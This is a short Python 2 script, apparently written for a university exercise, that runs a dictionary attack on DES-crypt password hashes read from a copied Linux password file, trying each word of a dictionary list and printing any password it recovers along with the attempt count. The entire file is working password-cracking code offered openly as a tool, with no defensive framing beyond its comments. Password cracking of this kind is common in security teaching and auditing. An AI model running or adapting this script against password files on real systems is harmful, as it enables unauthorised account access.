#! /usr/bin/python

# cracker.py --- Run a dictionary attack against a Linux password file
#
# by Michael Burkhardt (mburkhardt@smu.edu)
# January 21, 2016

# ----------------------------------------------------------------------------
# Libraries
# ----------------------------------------------------------------------------
import crypt
import sys

# ----------------------------------------------------------------------------
# Let's have some fun
# ----------------------------------------------------------------------------
def anim(cnt):
  if (cnt % 1000) == 0:
    cnt = cnt / 1000
    frame = ['     ','.    ','..   ','...  ',' ... ','  ...','   ..','    .']
    framelen = len(frame)
    ch = frame[cnt%framelen]
    sys.stdout.write("\033[%dD%s %8d,000"%(18, ch, cnt))
    sys.stdout.flush()

# ----------------------------------------------------------------------------
# Read the dictionary into dict array
# ----------------------------------------------------------------------------
f = open("usr-share-dict-words.txt","r") # /usr/share/dict/words from MacOS
dict = f.readlines()
f.close()
print "There are %d words in the dictionary." % len(dict)

# ----------------------------------------------------------------------------
# Open the password file and run the attack
# ----------------------------------------------------------------------------
f = open('etc-password.txt','r')
for line in f:
  cpw = line.split(':')[1]
  salt = cpw[:2] # first two characters of the password hash
  print "\n\n*** Attempting to crack password '%s'..." % cpw
  numwords = 0
  cracked = False
  for word in dict:
    numwords = numwords + 1
    anim(numwords)
    word = word.strip()
    if crypt.crypt(word,salt) == cpw:
      cracked = True
      break
  print "\n"
  if cracked:
      print "The password is: %s" % word
      print "It took %d attempts." % numwords
  else:
    print "I could not crack the password. :-("

f.close()


